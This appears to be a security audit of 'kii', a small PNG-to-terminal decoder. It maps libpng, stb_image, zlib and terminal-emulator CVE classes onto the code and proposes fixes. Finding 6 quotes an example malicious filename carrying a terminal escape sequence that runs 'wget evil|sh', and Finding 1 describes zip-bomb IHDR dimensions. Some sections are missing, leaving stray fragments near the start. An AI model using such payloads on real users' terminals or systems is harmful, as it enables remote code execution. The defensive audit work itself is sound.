# kii — 2026-05-22 Security Audit (M7 / v0.8.0 cycle)

> **Status**: M7(a) deliverable. Land first; M7(b) fuzz scaling + (c)
> hardening + (d) bench-matrix close-out are downstream of the findings

> M7 for sub-bite cadence.

## 1. Scope and Methodology

This audit walks the published vulnerability history of every substrate
class kii draws on, assesses kii-applicability per CVE, and synthesizes
the cross-substrate patterns into a concrete hardening checklist for
M7(c). Coverage:

| Substrate | Why kii cares | CVE window walked |
|---|---|---|
| **libpng** | Canonical PNG-decoder reference impl; kii is a port-by-shape | 2010-01-01 → 2026-05 (41 entries) |
| **lodepng + stb_image** | Single-file PNG decoders closest to kii's shape (~1k LOC) | 2017-01 → 2026-05 (47 entries) |
| **zlib (via sankoch)** | DEFLATE spec mechanics transfer regardless of impl language | 2002-03 → 2026-02 (15 entries) |
| **Terminal emulators** | kii emits ANSI to stdout/stderr; terminals trust their input stream | 2003-01 → 2026-04 (37 entries) |

Method: parallel WebSearch + WebFetch across NVD, CVE.org, Mitre,
GitHub Security Advisories, OSV.dev, and the substrate maintainers'
own changelogs / issue trackers. Each row carries an explicit
**kii-applicable?** call grounded in either (a) feature scope (kii
rejects Adam7, sub-byte depths, ancillary chunks beyond IHDR/PLTE/IDAT/
IEND), (b) language safety (Cyrius pointer/integer model differs from
C), or (c) parser-path divergence. Sources cited per row.

The threat model the audit operates against is captured in
[`../../SECURITY.md`](../../SECURITY.md); this doc is the
audit-findings layer below it.

**same two-line cap** added at IHDR validation, plus a one-line ratio

escape-and-reject helper. These four edits close the bulk of the
exploitable surface.

## 4. kii-specific findings (code-grounded)

### Finding 1 — Lying-IHDR zip-bomb is reachable
**Severity**: high. **Files**: `src/png.cyr:692-695, 698-702`.

The pixel-decode path computes:

```cyrius
var bpp           = channels * (bit_depth / 8);
var row_bytes     = width * bpp;
var inflated_size = height * (1 + row_bytes);
var pixel_size    = height * row_bytes;
...
var inflated = alloc(inflated_size);
```

`width` and `height` are u32 fields parsed from IHDR with **no cap**.
A PNG declaring `width=65535, height=65535, color_type=6, bit_depth=16`
produces `bpp=8`, `row_bytes=524280`, `inflated_size ≈ 34 GB` — a
single `alloc(34 GB)` attempt either OOMs the host or, on systems with
overcommit, succeeds and then page-faults during inflate. At extremal
values (`width=height=2^31-1`) the i64 multiply wraps and `alloc()`
receives a negative integer.

**Hardening (M7(c))**: add two compile-time ceilings:

```cyrius
var KII_MAX_PIXELS    = 16777216;   # 4096 × 4096 — generous for a terminal display tool
var KII_MAX_RAW_BYTES = 268435456;  # 256 MB hard ceiling
```

Validate at IHDR-parse (before any alloc):

- `width > 0 && height > 0`
- `width ≤ 65535 && height ≤ 65535`
- `width * height ≤ KII_MAX_PIXELS` (in u64 arithmetic)
- `height * (1 + row_bytes) ≤ KII_MAX_RAW_BYTES`

New error code: `PNG_ERR_DIMENSIONS = 12`.

### Finding 2 — IDAT-fusing accumulator has no cap
**Severity**: high. **Files**: `src/png.cyr:507, 535-541` +
`_png_copy_idat:208-269`.

Phase-1 walker computes `idat_total = sum(chunk_len for chunk in IDATs)`
with no cap; phase-2 `alloc(idat_total)` and then `_png_copy_idat`
streams all IDAT bytes into one contiguous buffer. This is the **exact**
stb_image OSS-Fuzz #32803 / stb #1928 Bug 7 / lodepng #165 attack
surface. A PNG with thousands of large IDAT chunks (each within PNG's
2^31 per-chunk-spec limit) can demand a multi-GB single allocation.

**Hardening (M7(c) — as shipped)**: cap accumulated IDAT total against
the absolute `KII_MAX_RAW_BYTES` ceiling. Earlier draft (now removed)
used a relative cap of `inflated_size × 1.5`, but zlib/DEFLATE header
overhead is constant (~10–20 bytes), so for tiny inflated payloads the
legitimate idat:inflated ratio exceeds the multiplier (e.g. a 2×2 RGB
PNG has `inflated_size = 14` and a real zlib stream of ~22 bytes —
ratio 1.57 — which the relative cap rejected). The absolute cap is
both simpler and uniformly correct.

```cyrius
if (idat_total > KII_MAX_RAW_BYTES) { return PNG_ERR_IDAT_TOO_LARGE; }
```

New error code: `PNG_ERR_IDAT_TOO_LARGE = 13`.

### Finding 3 — No compression-ratio sanity check
**Severity**: medium. **Files**: `src/png.cyr:700`.

The sankoch invocation passes `inflated_size` as `out_cap`, which is
the second line of defense. The first-line check — refuse to call
sankoch at all when `inflated_size / idat_total > DEFLATE's 1032:1
theoretical max` — is absent.

**Hardening (M7(c))**: before `zlib_decompress`:

```cyrius
# DEFLATE's theoretical max is 1032:1. Anything above 1100:1 is
# either malformed or a bomb.
if (idat_total > 0 && (inflated_size / idat_total) > 1100) {
    return PNG_ERR_RATIO_TOO_HIGH;
}
```

New error code: `PNG_ERR_RATIO_TOO_HIGH = 14`.

### Finding 4 — IHDR color-type × bit-depth cross-product not enforced
**Severity**: medium. **Files**: `src/png.cyr:682-684`.

Current validation:

```cyrius
if (bit_depth != 8 && bit_depth != 16) { return PNG_ERR_BITDEPTH; }
var channels = _png_color_channels(color_type);
if (channels < 0) { return PNG_ERR_BITDEPTH; }
```

This rejects sub-byte depths and unknown color_types but does **not**
reject spec-illegal combinations like `color_type=3` (palette) at
`bit_depth=16` (palette tops out at 8). PNG spec § 11.2.2 Table 11.1
lists exactly the legal combos:

| color_type | legal bit_depths |
|---|---|
| 0 (greyscale)   | 1, 2, 4, 8, 16 |
| 2 (RGB)         | 8, 16 |
| 3 (palette)     | 1, 2, 4, 8 |
| 4 (grey+alpha)  | 8, 16 |
| 6 (RGBA)        | 8, 16 |

kii's tier-1 (8/16 only) reduces this to:

| color_type | legal at tier-1 |
|---|---|
| 0 | 8, 16 |
| 2 | 8, 16 |
| 3 | **8 only** (1/2/4 rejected by sub-byte rule; 16 spec-illegal) |
| 4 | 8, 16 |
| 6 | 8, 16 |

**Hardening (M7(c))**: add an explicit allow-list check after the
existing two:

```cyrius
if (color_type == 3 && bit_depth == 16) { return PNG_ERR_BITDEPTH; }
```

(The other 9 combinations are already legal given the prior two
checks.)

### Finding 5 — color_type=3 (palette) pixel-index decode: ALREADY MITIGATED
**Severity**: trace (downgraded from "deferred" after code re-read).
**Files**: `src/downscale.cyr:73`, `src/quant.cyr:129`.

Initial audit reading suggested kii's palette-index decode was vulnerable
to the stb #1861 / #1928 Bug 5 class (decoder reads past PLTE end,
leaking stack/heap memory). Code re-read showed **both PLTE-lookup
sites already bounds-check**:

```cyrius
# downscale.cyr:66-82 (and quant.cyr:121-135 — identical pattern)
if (color_type == 3) {
    if (plte_buf == 0 || plte_size == 0) { return 0 - 1; }
    var pi = load8(pixels + pix_off);
    var po = pi * 3;
    # Defensive bounds — OOB indices map to black (entry 0 would
    # also work; black is the safer "did not match" sentinel).
    if (po + 2 < plte_size) {
        store8(out_buf + 0, load8(plte_buf + po + 0));
        store8(out_buf + 1, load8(plte_buf + po + 1));
        store8(out_buf + 2, load8(plte_buf + po + 2));
    } else {
        store8(out_buf + 0, 0);
        store8(out_buf + 1, 0);
        store8(out_buf + 2, 0);
    }
    return 0;
}
```

The `po + 2 < plte_size` guard correctly defends against the
attacker-supplied palette index reaching beyond the PLTE buffer; the
fallback substitutes black rather than reading past. This matches
libpng's defensive pattern, not stb's "trust the index" pattern.

**No M7(c) code change required for this finding.** color_type=3
support is preserved at v0.8.0 with no feature regression. Adding the
fuzz coverage at M7(b) (random palette indices vs. random PLTE
lengths) confirms the invariant under stress.

### Finding 6 — Stderr path-echo emits raw user-controlled bytes
**Severity**: high. **Files**: `src/main.cyr:58-64, 80-98`.

```cyrius
fn _eprint_path_msg(path, msg): i64 {
    _eprint(path);
    _eprint(": ");
    _eprint(msg);
    _eprint("\n");
    return 0;
}
```

`_eprint` writes the path bytes-for-bytes via `syscall(1, 2, s,
strlen(s))`. A malicious filename like
`/tmp/\x1b]2;wget evil|sh\x07\x1b[21t.png` propagates to the user's
terminal verbatim. This is the **CVE-2021-25743-class exposure** and
opens the full DECRQSS/OSC/title/paste attack surface enumerated in §
3.4. Same defect on `_eprint_quant_summary` (also echoes raw path on
verbose success path).

**Hardening (M7(c))**: introduce `_eprint_path_safe(path)` that walks
the path once and either echoes it verbatim or substitutes when
control bytes are detected. The rule is the **coreutils-`ls` shape**:
reject only C0 controls (0x00–0x1F except `\t` 0x09 and `\n` 0x0A) +
DEL (0x7F). The C1 high-range (0x80–0x9F) is **not** rejected because
of UTF-8 pass-through — AGNOS naming surface uses Hawaiian / Sanskrit /
East-Asian characters whose UTF-8 continuation bytes routinely land in
0x80–0xBF. ESC (0x1B), the primary injection vector, is already in C0
range and rejected. Residual risk: 8-bit C1-mode terminals (rare today;
UTF-8 mode is the modern default) could be reached via 0x9B / 0x9D
aliases — accepted residual risk for v0.8.0, revisit if a target
terminal needs the stricter rule.

```cyrius
fn _eprint_path_safe(path): i64 {
    var len = strlen(path);
    var i = 0;
    while (i < len) {
        var b = load8(path + i);
        # C0 controls (excluding TAB and LF) + DEL — universally dangerous
        # in every terminal mode. ESC (0x1B), BEL (0x07), and the other
        # C0 controls are all here. C1 high-range (0x80–0x9F) is NOT
        # rejected: UTF-8 paths routinely include those bytes as
        # multi-byte-sequence continuations.
        if ((b < 0x20 && b != 0x09 && b != 0x0A) || b == 0x7F) {
            _eprint("<path containing control bytes — suppressed>");
            return 0;
        }
        i = i + 1;
    }
    _eprint(path);
    return 0;
}
```

Then route `_eprint_path_msg` and `_eprint_quant_summary` through it.
~12 lines, closes the entire stderr injection surface in UTF-8 mode.

### Finding 7 — Sub-bite-(a) audit items for sankoch upstream
**Severity**: deferred-upstream. **Files**: sankoch repo (external).

Three zlib spec-level CVE classes transfer to any DEFLATE impl:

- **CVE-2005-2096-class**: incomplete code description of length > 1
  must be rejected before `inflate_table()` builds.
- **CVE-2005-1849-class**: dynamic-tree storage explosion via crafted
  HLIT/HDIST/HCLEN — table sizes must be hard-bounded at fixed
  compile-time maxima.
- **CVE-2022-37434-class**: gzip-wrapping path (if sankoch exposes
  one) must be gated off for PNG callers.

**Action**: file three issues on the sankoch repo cross-referencing
this audit; treat as upstream gates for kii v0.8.0 release. If sankoch
already implements these (likely), the audit can mark them resolved
during M7(d) close-out.

### Finding 8 — chunk-ordering FSM partial
**Severity**: low. **Files**: `src/png.cyr:439-522`.

The walker has positional IHDR enforcement (IHDR is read by direct
post-signature seek) and detects IEND via flag, but does not reject:

- duplicate IEND (a second IEND in the file is silently accepted as
  walk-terminator — but the walker exits after the first, so this is
  inert; documented as deferred)
- PLTE after first IDAT (spec § 5.6: PLTE must precede IDAT)
- multiple PLTE chunks (current code overwrites the captured PLTE
  buffer; potential alloc-leak on second-PLTE path)

**Hardening (M7(c), low priority)**: track `seen_idat` and `seen_plte`
booleans across the walker; reject `is_plte == 1 && seen_idat == 1`
with `PNG_ERR_HEADER`, and `is_plte == 1 && seen_plte == 1` likewise.

### Finding 9 — 16-bit-per-channel filter-undo path stride
**Severity**: low. **Files**: `src/png.cyr:692-727`.

`bit_depth=16` is accepted (tier-1 scope) and `bpp = channels * 2` is
computed, but **the filter-undo loop in `_png_unfilter_row` treats every
byte uniformly** (it doesn't pair-up the two bytes of a 16-bit sample
for Sub/Paeth left-byte lookup). This matches the PNG spec § 9 — filters
operate byte-wise on the filtered scanline, and Sub uses the
**byte-corresponding-position-in-previous-pixel** which for bit_depth=16
means `bpp=2*channels` byte stride. The current code uses `bpp` directly
as the stride, which is **correct** by spec. Verified: no bug here.

However, lodepng #227 (16-bit crash) suggests this is an error-prone
area; recommend adding a fuzz row at M7(b) that synthesizes
bit_depth=16 PNGs with crafted filter-byte sequences and confirms clean
decode or rejection.

### Finding 10 — Paeth predictor signed-int arithmetic
**Severity**: trace. **Files**: `src/png.cyr:584-592`.

```cyrius
fn _png_paeth(a, b, c): i64 {
    var p = a + b - c;
    var pa = p - a; if (pa < 0) { pa = 0 - pa; }
    var pb = p - b; if (pb < 0) { pb = 0 - pb; }
    var pc = p - c; if (pc < 0) { pc = 0 - pc; }
    if (pa <= pb && pa <= pc) { return a; }
    if (pb <= pc) { return b; }
    return c;
}
```

Uses i64 throughout (Cyrius default) with explicit `< 0` checks for
`abs`. This is correct — PNG spec § 9.4 explicitly requires the
intermediate `p = a + b - c` to be signed arithmetic. Matches libpng's
canonical impl. No change needed.

## 6. Residual risk acceptance (post-M7)

The following are explicitly **accepted residual risks** for v1.0:

- **Terminal-emulator parser bugs in the bytes kii emits.** kii commits
  to emitting a strict subset (CSI SGR 0 / 38;5;N / 48;5;N with
  bound-checked N ∈ [0,255], plus half-block glyphs `▀`/`▄`, spaces, and
  newlines). If a terminal mishandles this subset, that is the
  terminal's bug, not kii's. SECURITY.md will document this commitment.
- **256-color SGR support across terminals**. tier-1 uses 256-color
  background emit; some legacy terminals (notably `TERM=linux` console)
  may render incorrectly. Cross-terminal verification is M8 scope, not
  a security item.
- **Sankoch's internal correctness on the three spec-level CVE
  classes**. The three zlib CVEs that transfer (2004-0797 / 2005-1849 /
  2005-2096) are upstream-sankoch audit items; kii's mitigation surface
  is the pre-inflate caps (findings 1–3). If sankoch ships a bug in
  Huffman-table construction, kii catches the symptom (output-size
  mismatch → `PNG_ERR_INFLATE`) but cannot fix the cause.
- **Sub-byte bit-depths (1/2/4), Adam7 interlacing, tEXt/iTXt/zTXt/iCCP
  decode, APNG, EXIF**. All explicitly rejected or skipped at v1.0.
  Adding any of these post-v1 requires a re-audit per
  CLAUDE.md spec-only-feature-set rule.
- **Tier-2 (256-color, truecolor, dither) and tier-3 (Sixel, Kitty,
  iTerm2 inline)**. Post-v1; tier-3 in particular moves kii into the
  same opcode family as CVE-2017-14146 / CVE-2026-41253 attacks and
  needs its own threat-model section when scoped.
